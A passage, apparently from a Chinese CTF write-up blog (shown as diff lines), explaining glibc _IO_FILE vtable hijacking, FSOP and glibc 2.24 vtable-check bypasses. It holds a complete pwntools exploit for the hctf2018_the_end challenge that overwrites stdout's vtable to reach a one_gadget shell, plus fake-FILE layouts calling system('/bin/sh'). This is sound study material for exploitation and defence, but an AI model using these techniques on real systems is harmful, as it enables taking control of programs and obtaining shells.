+<p><strong>2、覆盖指向vtable的指针指向我们控制的内存，在其中布置函数指针</strong></p>
+<h3 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h3><h4 id="hctf2018-the-end"><a href="#hctf2018-the-end" class="headerlink" title="hctf2018_the_end"></a>hctf2018_the_end</h4><p>1、检查保护：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220330100226842.png"></p>
+<p>2、静态分析：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220330101649057.png"></p>
+<p>关闭了输出和错误流</p>
+<p>程序提供了libc地址</p>
+<p>3、思路分析：</p>
+<p>程序能够写5个字节</p>
+<p>&#x3D;&#x3D;》利用程序调用exit()后，会遍历_IO_list_all&#x3D;&#x3D;》调用_IO_2_1_stdout_下的vtable中的_setbuf函数</p>
+<p>&#x3D;&#x3D;》可以先修改两个字节在当前vtables附近伪造一个fake_vtable，然后使用3个字节修改fake_vtables中_setbuf的内容为one_gadget</p>
+<p>&#x3D;&#x3D;&#x3D;》</p>
+<p>1、_IO_2_1_stdout和libc的偏移：&#x3D;&#x3D;》记作off_set_3</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220330153446553.png"></p>
+<p>2、查找set_buf在虚表中的偏移：</p>
+<pre class="language-none"><code class="language-none">p *(const struct _IO_jump_t *) _IO_2_1_stdout_.vtable</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220330153846988.png"></p>
+<p>偏移为0x58</p>
+<p>3、执行exit()首先遍历_IO_list_all，再去调用_IO_2_1_stdout</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220330154711268.png"></p>
+<p>&#x3D;&#x3D;》_IO_2_1_stdout:0x7ffff7dd2620</p>
+<p>4、寻找fake_vtable，使fake_vtable_addr+0x58&#x3D;&#x3D;libcbase+0ff_set_3</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#coding=UTF-8</span>
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token punctuation">)</span>
+io<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token comment">#io=remote()</span>
+
+offset_setbuf_of_vtable <span class="token operator">=</span> <span class="token number">0x58</span>
+offset_vtable_of_stdout <span class="token operator">=</span> <span class="token number">0xd8</span>
+offset_one_gadget <span class="token operator">=</span> <span class="token number">0xF02A4</span>
+
+sleep_addr <span class="token operator">=</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">', good luck'</span><span class="token punctuation">,</span>drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
+sleep_addr <span class="token operator">=</span> <span class="token builtin">long</span><span class="token punctuation">(</span>sleep_addr<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
+
+libc_base <span class="token operator">=</span> sleep_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'sleep'</span><span class="token punctuation">]</span>
+
+one_gadget_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> offset_one_gadget
+
+_IO_2_1_stdout_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stdout_'</span><span class="token punctuation">]</span>
+stdout_vtable <span class="token operator">=</span> _IO_2_1_stdout_addr <span class="token operator">+</span> offset_vtable_of_stdout
+
+fake_vtable_addr <span class="token operator">=</span> _IO_2_1_stdout_addr <span class="token operator">+</span> <span class="token number">0x48</span>
+fake_vtable_setbuf <span class="token operator">=</span> fake_vtable_addr <span class="token operator">+</span> <span class="token number">0x58</span>
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>stdout_vtable <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>fake_vtable_addr<span class="token punctuation">)</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
+ 
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>fake_vtable_setbuf <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>one_gadget_addr<span class="token punctuation">)</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
+    
+io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"exec /bin/sh 1>&amp;0"</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+
+
+
+<h3 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP:"></a>FSOP:</h3><p>进程内所有的_IO_FILE结构会使用_chain域相互连接形成一个链表，由_IO_list_all维护</p>
+<p>&#x3D;&#x3D;&#x3D;》核心：劫持_IO_list_all的值来伪造链表和其中的_IO_FILE项</p>
+<p>&#x3D;&#x3D;&#x3D;》触发方法：调用_IO_flush_all_lockp(刷新_IO_list_all链表中所有项的文件流)</p>
+<p>&#x3D;&#x3D;》触发流程：</p>
+<p>unsorted bin&#x3D;&#x3D;&gt;malloc_printerr&#x3D;&#x3D;&gt;__libc_message&#x3D;&#x3D;&gt;about&#x3D;&#x3D;&gt;fflush(_IO_flush_all_lockp)&#x3D;&#x3D;&gt;vtable</p>
+<p>&#x3D;&#x3D;&gt;_IO_OVERFLOW&#x3D;&#x3D;&gt;get shell</p>
+<p>&#x3D;&#x3D;》相当于对每个FILE调用fflush（刷新缓冲区）&#x3D;&#x3D;》</p>
+<p>调用_IO_FILE_plus.vtable中的_IO_overflow:</p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span>
+<span class="token function">_IO_flush_all_lockp</span> <span class="token punctuation">(</span><span class="token keyword">int</span> do_lock<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+  fp <span class="token operator">=</span> <span class="token punctuation">(</span>_IO_FILE <span class="token operator">*</span><span class="token punctuation">)</span> _IO_list_all<span class="token punctuation">;</span>
+  <span class="token keyword">while</span> <span class="token punctuation">(</span>fp <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
+  <span class="token punctuation">&#123;</span>
+       <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+       <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>fp<span class="token operator">-></span>_mode <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> fp<span class="token operator">-></span>_IO_write_ptr <span class="token operator">></span> fp<span class="token operator">-></span>_IO_write_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
+               <span class="token operator">&amp;&amp;</span> <span class="token function">_IO_OVERFLOW</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> <span class="token constant">EOF</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">EOF</span><span class="token punctuation">)</span>
+           <span class="token punctuation">&#123;</span>
+               result <span class="token operator">=</span> <span class="token constant">EOF</span><span class="token punctuation">;</span>
+          <span class="token punctuation">&#125;</span>
+        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+<p>_IO_flush_all_lockp不需要手动调用&#x3D;&#x3D;&gt;</p>
+<p>某些情况会被系统调用：</p>
+<p>1、当libc执行about函数</p>
+<p>2、当执行exit函数</p>
+<p>3、当执行流从main函数返回时</p>
+<h4 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h4><p>1、需要libc基地址&#x3D;&#x3D;&gt;_IO_list_all是作为全局变量储存在libc中的，不泄漏libc就不能改写_IO_list_all</p>
+<p>2、需要使用任意地址写把_IO_list_all的内容修改为指向我们可控的内存的指针</p>
+<p>3、在可控内存中布置数据&#x3D;&#x3D;》布置一个目标函数的vtable指针</p>
+<p>布置依据：</p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token function">_IO_flush_all_lockp</span> <span class="token punctuation">(</span><span class="token keyword">int</span> do_lock<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token keyword">int</span> result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+  FILE <span class="token operator">*</span>fp<span class="token punctuation">;</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">_IO_MTSAFE_IO</span></span>
+  <span class="token function">_IO_cleanup_region_start_noarg</span> <span class="token punctuation">(</span>flush_cleanup<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">_IO_lock_lock</span> <span class="token punctuation">(</span>list_all_lock<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
+  <span class="token keyword">for</span> <span class="token punctuation">(</span>fp <span class="token operator">=</span> <span class="token punctuation">(</span>FILE <span class="token operator">*</span><span class="token punctuation">)</span> _IO_list_all<span class="token punctuation">;</span> fp <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span> fp <span class="token operator">=</span> fp<span class="token operator">-></span>_chain<span class="token punctuation">)</span><span class="token comment">//遍历_IO_list_all</span>
+    <span class="token punctuation">&#123;</span>
+      run_fp <span class="token operator">=</span> fp<span class="token punctuation">;</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span>do_lock<span class="token punctuation">)</span>
+        <span class="token function">_IO_flockfile</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>fp<span class="token operator">-></span>_mode <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> fp<span class="token operator">-></span>_IO_write_ptr <span class="token operator">></span> fp<span class="token operator">-></span>_IO_write_base<span class="token punctuation">)</span><span class="token comment">/*一些检查，需要绕过*/</span>
+           <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token function">_IO_vtable_offset</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span>
+               <span class="token operator">&amp;&amp;</span> fp<span class="token operator">-></span>_mode <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_wide_data<span class="token operator">-></span>_IO_write_ptr
+                                    <span class="token operator">></span> fp<span class="token operator">-></span>_wide_data<span class="token operator">-></span>_IO_write_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
+           <span class="token punctuation">)</span>
+          <span class="token operator">&amp;&amp;</span> <span class="token function">_IO_OVERFLOW</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> <span class="token constant">EOF</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">EOF</span><span class="token punctuation">)</span><span class="token comment">/* 当前的fp指针作为_IO_OVERFLOW的参数，执行函数*/</span>
+        result <span class="token operator">=</span> <span class="token constant">EOF</span><span class="token punctuation">;</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span>do_lock<span class="token punctuation">)</span>
+        <span class="token function">_IO_funlockfile</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      run_fp <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">_IO_MTSAFE_IO</span></span>
+  <span class="token function">_IO_lock_unlock</span> <span class="token punctuation">(</span>list_all_lock<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">_IO_cleanup_region_end</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
+  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+<p>&#x3D;&#x3D;》fp-&gt;_mode&lt;&#x3D;0    &#x2F;&#x2F;     fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</p>
+<h3 id="glibc2-24利用："><a href="#glibc2-24利用：" class="headerlink" title="glibc2.24利用："></a>glibc2.24利用：</h3><p>glibc2.24版本加入针对IO_FILE_plus的vtable劫持的检测措施，glibc会在调用虚函数之前首先检查vtable地址的合法性&#x3D;&#x3D;》</p>
+<p>首先验证vtable是否位于_IO_vtable段中&#x3D;&#x3D;》满足条件则正常执行，否则调用_IO_vtable_check做进一步检查</p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">/* Check if unknown vtable pointers are permitted; otherwise,
+   terminate the process.  */</span>
+<span class="token keyword">void</span> <span class="token function">_IO_vtable_check</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> attribute_hidden<span class="token punctuation">;</span>
+<span class="token comment">/* Perform vtable pointer validation.  If validation fails, terminate
+   the process.  */</span>
+<span class="token keyword">static</span> <span class="token keyword">inline</span> <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">_IO_jump_t</span> <span class="token operator">*</span>
+<span class="token function">IO_validate_vtable</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">_IO_jump_t</span> <span class="token operator">*</span>vtable<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token comment">/* Fast path: The vtable pointer is within the __libc_IO_vtables
+     section.  */</span>
+  <span class="token class-name">uintptr_t</span> section_length <span class="token operator">=</span> __stop___libc_IO_vtables <span class="token operator">-</span> __start___libc_IO_vtables<span class="token punctuation">;</span>
+  <span class="token comment">//vtable必须在__stop__libc_IO_vtable和__start__libc_IO_vtable之间</span>
+    
+  <span class="token class-name">uintptr_t</span> ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uintptr_t</span><span class="token punctuation">)</span> vtable<span class="token punctuation">;</span>
+  <span class="token class-name">uintptr_t</span> offset <span class="token operator">=</span> ptr <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token class-name">uintptr_t</span><span class="token punctuation">)</span> __start___libc_IO_vtables<span class="token punctuation">;</span>
+  
+   
+  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__glibc_unlikely</span> <span class="token punctuation">(</span>offset <span class="token operator">>=</span> section_length<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token comment">/* The vtable pointer is not in the expected section.  Use the
+       slow path, which will terminate the process if necessary.  */</span>
+    <span class="token function">_IO_vtable_check</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//引发报错函数</span>
+  <span class="token keyword">return</span> vtable<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+<p><strong>_IO_vtable_check:</strong></p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> attribute_hidden
+<span class="token function">_IO_vtable_check</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">SHARED</span></span>
+  <span class="token comment">/* Honor the compatibility flag.  */</span>
+  <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>flag<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">atomic_load_relaxed</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span>IO_accept_foreign_vtables<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">PTR_DEMANGLE</span></span>
+  <span class="token function">PTR_DEMANGLE</span> <span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token operator">&amp;</span>_IO_vtable_check<span class="token punctuation">)</span>
+    <span class="token keyword">return</span><span class="token punctuation">;</span>
+
+  <span class="token comment">/* In case this libc copy is in a non-default namespace, we always
+     need to accept foreign vtables because there is always a
+     possibility that FILE * objects are passed across the linking
+     boundary.  */</span>
+  <span class="token punctuation">&#123;</span>
+    Dl_info di<span class="token punctuation">;</span>
+    <span class="token keyword">struct</span> <span class="token class-name">link_map</span> <span class="token operator">*</span>l<span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>_dl_open_hook <span class="token operator">!=</span> <span class="token constant">NULL</span>
+        <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token function">_dl_addr</span> <span class="token punctuation">(</span>_IO_vtable_check<span class="token punctuation">,</span> <span class="token operator">&amp;</span>di<span class="token punctuation">,</span> <span class="token operator">&amp;</span>l<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span>
+            <span class="token operator">&amp;&amp;</span> l<span class="token operator">-></span>l_ns <span class="token operator">!=</span> LM_ID_BASE<span class="token punctuation">)</span><span class="token punctuation">)</span>
+      <span class="token keyword">return</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">else</span> <span class="token comment">/* !SHARED */</span></span>
+  <span class="token comment">/* We cannot perform vtable validation in the static dlopen case
+     because FILE * handles might be passed back and forth across the
+     boundary.  Therefore, we disable checking in this case.  */</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>__dlopen <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span><span class="token punctuation">;</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
+
+  <span class="token function">__libc_fatal</span> <span class="token punctuation">(</span><span class="token string">"Fatal error: glibc detected an invalid stdio handle\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+<p>&#x3D;&#x3D;》如果vtable是非法的，将会引发about</p>
+<p>&#x3D;&#x3D;》绕过检查：</p>
+<p>利用IO_str_jumps和IO_wstr_jumps这两个结构体可以绕过check</p>
+<p>&#x3D;&#x3D;》这两个vtable不在check范围内</p>
+<p>&#x3D;&#x3D;》</p>
+<h4 id="IO-str-jumps绕过："><a href="#IO-str-jumps绕过：" class="headerlink" title="IO_str_jumps绕过："></a>IO_str_jumps绕过：</h4><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">_IO_jump_t</span> _IO_str_jumps libio_vtable <span class="token operator">=</span>
+<span class="token punctuation">&#123;</span>
+  JUMP_INIT_DUMMY<span class="token punctuation">,</span>
+  <span class="token function">JUMP_INIT</span><span class="token punctuation">(</span>finish<span class="token punctuation">,</span> _IO_str_finish<span class="token punctuation">)</span><span class="token punctuation">,</span>
+  <span class="token function">JUMP_INIT</span><span class="token punctuation">(</span>overflow<span class="token punctuation">,</span> _IO_str_overflow<span class="token punctuation">)</span><span class="token punctuation">,</span>
+  <span class="token function">JUMP_INIT</span><span class="token punctuation">(</span>underflow<span class="token punctuation">,</span> _IO_str_underflow<span class="token punctuation">)</span><span class="token punctuation">,</span>
+  <span class="token function">JUMP_INIT</span><span class="token punctuation">(</span>uflow<span class="token punctuation">,</span> _IO_default_uflow<span class="token punctuation">)</span><span class="token punctuation">,</span>
+  <span class="token function">JUMP_INIT</span><span class="token punctuation">(</span>pbackfail<span class="token punctuation">,</span> _IO_str_pbackfail<span class="token punctuation">)</span><span class="token punctuation">,</span>
+  <span class="token function">JUMP_INIT</span><span class="token punctuation">(</span>xsputn<span class="token punctuation">,</span> _IO_default_xsputn<span class="token punctuation">)</span><span class="token punctuation">,</span>
+  <span class="token function">JUMP_INIT</span><span class="token punctuation">(</span>xsgetn<span class="token punctuation">,</span> _IO_default_xsgetn<span class="token punctuation">)</span><span class="token punctuation">,</span>
+  <span class="token function">JUMP_INIT</span><span class="token punctuation">(</span>seekoff<span class="token punctuation">,</span> _IO_str_seekoff<span class="token punctuation">)</span><span class="token punctuation">,</span>
+  <span class="token function">JUMP_INIT</span><span class="token punctuation">(</span>seekpos<span class="token punctuation">,</span> _IO_default_seekpos<span class="token punctuation">)</span><span class="token punctuation">,</span>
+  <span class="token function">JUMP_INIT</span><span class="token punctuation">(</span>setbuf<span class="token punctuation">,</span> _IO_default_setbuf<span class="token punctuation">)</span><span class="token punctuation">,</span>
+  <span class="token function">JUMP_INIT</span><span class="token punctuation">(</span>sync<span class="token punctuation">,</span> _IO_default_sync<span class="token punctuation">)</span><span class="token punctuation">,</span>
+  <span class="token function">JUMP_INIT</span><span class="token punctuation">(</span>doallocate<span class="token punctuation">,</span> _IO_default_doallocate<span class="token punctuation">)</span><span class="token punctuation">,</span>
+  <span class="token function">JUMP_INIT</span><span class="token punctuation">(</span>read<span class="token punctuation">,</span> _IO_default_read<span class="token punctuation">)</span><span class="token punctuation">,</span>
+  <span class="token function">JUMP_INIT</span><span class="token punctuation">(</span>write<span class="token punctuation">,</span> _IO_default_write<span class="token punctuation">)</span><span class="token punctuation">,</span>
+  <span class="token function">JUMP_INIT</span><span class="token punctuation">(</span>seek<span class="token punctuation">,</span> _IO_default_seek<span class="token punctuation">)</span><span class="token punctuation">,</span>
+  <span class="token function">JUMP_INIT</span><span class="token punctuation">(</span>close<span class="token punctuation">,</span> _IO_default_close<span class="token punctuation">)</span><span class="token punctuation">,</span>
+  <span class="token function">JUMP_INIT</span><span class="token punctuation">(</span>stat<span class="token punctuation">,</span> _IO_default_stat<span class="token punctuation">)</span><span class="token punctuation">,</span>
+  <span class="token function">JUMP_INIT</span><span class="token punctuation">(</span>showmanyc<span class="token punctuation">,</span> _IO_default_showmanyc<span class="token punctuation">)</span><span class="token punctuation">,</span>
+  <span class="token function">JUMP_INIT</span><span class="token punctuation">(</span>imbue<span class="token punctuation">,</span> _IO_default_imbue<span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre>
+
+<p>&#x3D;&#x3D;》可以利用_IO_str_finsh和_IO_str_overflow</p>
+<p>&#x3D;&#x3D;》</p>
+<h5 id="IO-str-finsh绕过："><a href="#IO-str-finsh绕过：" class="headerlink" title="_IO_str_finsh绕过："></a>_IO_str_finsh绕过：</h5><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">_IO_str_finish</span> <span class="token punctuation">(</span>FILE <span class="token operator">*</span>fp<span class="token punctuation">,</span> <span class="token keyword">int</span> dummy<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_IO_buf_base <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token punctuation">(</span>fp<span class="token operator">-></span>_flags <span class="token operator">&amp;</span> _IO_USER_BUF<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_IO_strfile <span class="token operator">*</span><span class="token punctuation">)</span> fp<span class="token punctuation">)</span><span class="token operator">-></span>_s<span class="token punctuation">.</span>_free_buffer<span class="token punctuation">)</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_IO_buf_base<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//call qword ptr [fp+0E8h]</span>
+  fp<span class="token operator">-></span>_IO_buf_base <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
+  <span class="token function">_IO_default_finish</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+<p>&#x3D;&#x3D;》</p>
+<p>若符合条件，该函数会将((_IO_strfile *) fp)-&gt;_s._free_buffer作为函数指针来直接调用，并且把</p>
+<p>(fp-&gt;_IO_buf_base)作为它的参数</p>
+<p>((_IO_strfile *) fp)-&gt;_s._free_buffer实在fp+0xe8的位置上</p>
+<pre class="language-c" data-language="c"><code class="language-c">fp<span class="token operator">-></span>_IO_buf_base<span class="token comment">//不为空</span>
+fp<span class="token operator">-></span>_flags <span class="token operator">&amp;</span> _IO_USER_BUF<span class="token comment">//为假</span>
+
+<span class="token comment">//构造</span>
+_flags<span class="token operator">=</span><span class="token punctuation">(</span>binsh_libc<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token number">1</span>
+_IO_buf_base<span class="token operator">=</span>binsh_addr
+
+_freeres_list<span class="token operator">=</span><span class="token number">0x2</span>
+_freeres_buf<span class="token operator">=</span><span class="token number">0x3</span>
+_mode<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>
+vtable<span class="token operator">=</span>_IO_str_finsh<span class="token operator">-</span><span class="token number">0x18</span>
+fp<span class="token operator">+</span><span class="token number">0xe8</span> <span class="token operator">-></span> system_addr
+<span class="token comment">/////////////////////////////////////////////////////////////////////////</span>
+fp<span class="token operator">-></span>_flags<span class="token operator">=</span><span class="token number">0</span>
+
+vtable<span class="token operator">=</span>_IO_str_jumps <span class="token operator">-</span> <span class="token number">0x8</span></code></pre>
+
+<p>&#x3D;&#x3D;》布置完后调用_IO_overflow时就会调用到_IO_str_finish</p>
+<p>&#x3D;&#x3D;》fp-&gt;_IO_buf_base &#x3D; &#x2F;bin&#x2F;sh_addr     &#x2F;&#x2F;      fp+0xe8 &#x3D; system_addr</p>
+<p>&#x3D;&#x3D;》_IO_str_overflow绕过：</p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span>
+<span class="token function">_IO_str_overflow</span> <span class="token punctuation">(</span>_IO_FILE <span class="token operator">*</span>fp<span class="token punctuation">,</span> <span class="token keyword">int</span> c<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token keyword">int</span> flush_only <span class="token operator">=</span> c <span class="token operator">==</span> <span class="token constant">EOF</span><span class="token punctuation">;</span>
+  _IO_size_t pos<span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_flags <span class="token operator">&amp;</span> _IO_NO_WRITES<span class="token punctuation">)</span><span class="token comment">// pass</span>
+      <span class="token keyword">return</span> flush_only <span class="token operator">?</span> <span class="token number">0</span> <span class="token operator">:</span> <span class="token constant">EOF</span><span class="token punctuation">;</span>
+  <span class="token comment">//条件需要为假</span>
+    
+  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>fp<span class="token operator">-></span>_flags <span class="token operator">&amp;</span> _IO_TIED_PUT_GET<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token punctuation">(</span>fp<span class="token operator">-></span>_flags <span class="token operator">&amp;</span> _IO_CURRENTLY_PUTTING<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+      fp<span class="token operator">-></span>_flags <span class="token operator">|=</span> _IO_CURRENTLY_PUTTING<span class="token punctuation">;</span>
+      fp<span class="token operator">-></span>_IO_write_ptr <span class="token operator">=</span> fp<span class="token operator">-></span>_IO_read_ptr<span class="token punctuation">;</span>
+      fp<span class="token operator">-></span>_IO_read_ptr <span class="token operator">=</span> fp<span class="token operator">-></span>_IO_read_end<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+  pos <span class="token operator">=</span> fp<span class="token operator">-></span>_IO_write_ptr <span class="token operator">-</span> fp<span class="token operator">-></span>_IO_write_base<span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>pos <span class="token operator">>=</span> <span class="token punctuation">(</span>_IO_size_t<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token function">_IO_blen</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span> <span class="token operator">+</span> flush_only<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">// 为真</span>
+    <span class="token punctuation">&#123;</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_flags <span class="token operator">&amp;</span> _IO_USER_BUF<span class="token punctuation">)</span>
